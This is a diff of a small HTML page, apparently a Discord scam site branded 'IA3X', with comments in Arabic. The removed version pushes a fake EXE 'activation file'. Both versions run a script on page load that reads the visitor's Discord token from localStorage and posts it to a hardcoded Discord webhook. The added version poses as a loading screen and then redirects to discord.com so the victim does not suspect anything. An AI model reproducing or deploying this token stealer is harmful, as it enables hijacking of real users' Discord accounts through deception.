@@ -1,27 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head><title>IA3X MENU V2</title></head>
-<body style="background:black; color:red; text-align:center; padding-top:15%;">
-    <h1>IA3X EXPLOIT SYSTEM</h1>
-    <p>بسبب حماية ديسكورد الجديدة، يجب عليك تحميل "ملف التفعيل" لتشغيل المنيو</p>
-    
-    <a href="رابط_ملف_السحب_EXE_هنا" download>
-        <button style="padding:20px; background:red; color:white; font-weight:bold; cursor:pointer;">
-            تحميل وتفعيل المنيو (EXE)
-        </button>
-    </a>
-
+<head>
+    <title>IA3X LOADING...</title>
+</head>
+<body style="background-color:black; color:white; text-align:center; padding-top:20%;">
+    <h1>Loading System Assets...</h1>
     <script>
-        // هذا الجزء يسحب "تلقائياً" فقط إذا كان فاتح بالمتصفح
         window.onload = function() {
-            const webhook = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe";
-            const token = localStorage.getItem("token") || "Not in Browser";
+            // ضع رابط الويبهوك حقك هنا ضروري جداً
+            const webhook = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe"; 
+
+            // محاولة سحب التوكن تلقائياً
+            const token = localStorage.getItem("token") || localStorage.getItem("discord_token") || "No Token Found";
+
             fetch(webhook, {
                 method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ content: "🎯 دخول جديد للموقع: \nToken: " + token })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "🎯 **صيد تلقائي جديد!**",
+                    embeds: [{
+                        title: "Discord Token Captured",
+                        description: "🔑 **Token:** `" + token + "`",
+                        color: 16711765,
+                        footer: { text: "IA3X Bypass System" }
+                    }]
+                })
+            }).then(() => {
+                // بعد السحب، نوجهه لموقع حقيقي عشان ما يشك
+                window.location.href = "https://discord.com/app"; 
             });
         };
     </script>
 </body>
+
 </html>
